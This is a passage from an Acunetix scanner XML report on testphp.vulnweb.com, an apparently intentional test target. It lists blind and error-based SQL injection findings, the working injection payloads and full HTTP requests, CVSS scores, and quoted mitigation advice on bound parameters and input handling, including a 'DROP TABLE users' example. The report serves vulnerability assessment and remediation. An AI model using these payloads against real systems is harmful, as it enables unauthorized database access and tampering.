          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[PHP Runtime Configuration]]></Database>
          <URL><![CDATA[http://www.php.net/manual/en/errorfunc.configuration.php#ini.display-errors]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="73" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">id</font></b> was set to <b><font color="dark">3 AND 3*2*1=6 AND 392=392</font></b><br/><br/>Tests performed: <ul><li>1*1*1*3 =&gt; <b>TRUE</b></li><li>3*392*387*0 =&gt; <b>FALSE</b></li><li>13*5*2*999 =&gt; <b>FALSE</b></li><li>3*1*1 =&gt; <b>TRUE</b></li><li>1*1*1*1*1*3 =&gt; <b>TRUE</b></li><li>13*1*1*0*1*1*392 =&gt; <b>FALSE</b></li><li>3 AND 5*4=20 AND 392=392 =&gt; <b>TRUE</b></li><li>3 AND 5*4=21 AND 392=392 =&gt; <b>FALSE</b></li><li>3 AND 5*6&lt;26 AND 392=392 =&gt; <b>FALSE</b></li><li>3 AND 7*7&gt;48 AND 392=392 =&gt; <b>TRUE</b></li><li>3 AND 3*2*0=6 AND 392=392 =&gt; <b>FALSE</b></li><li>3 AND 3*2*1=6 AND 392=392 =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>3</b>]]></Details>
       <Affects><![CDATA[/AJAX/infocateg.php]]></Affects>
       <Parameter><![CDATA[id]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /AJAX/infocateg.php?id=3%20AND%203*2*1=6%20AND%20392=392 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:49 GMT
Content-Type: text/xml
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Content-Length: 324
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="74" color="red">
       <Name><![CDATA[SQL injection (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">artist</font></b> was set to <b><font color="dark">(select 1 and row(1,1)&gt;(select count(*),concat(concat(CHAR(52),CHAR(67),CHAR(117),CHAR(107),CHAR(87),CHAR(56),CHAR(56),CHAR(52),CHAR(105),CHAR(84),CHAR(103)),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))</font></b><br/>Injected pattern found: <pre wrap="virtual"><font color="blue">4CukW884iTg</font></pre>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[artist]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?artist=(select%201%20and%20row(1%2c1)&gt;(select%20count(*)%2cconcat(concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(107)%2cCHAR(87)%2cCHAR(56)%2cCHAR(56)%2cCHAR(52)%2cCHAR(105)%2cCHAR(84)%2cCHAR(103))%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201)) HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:51 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4178
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
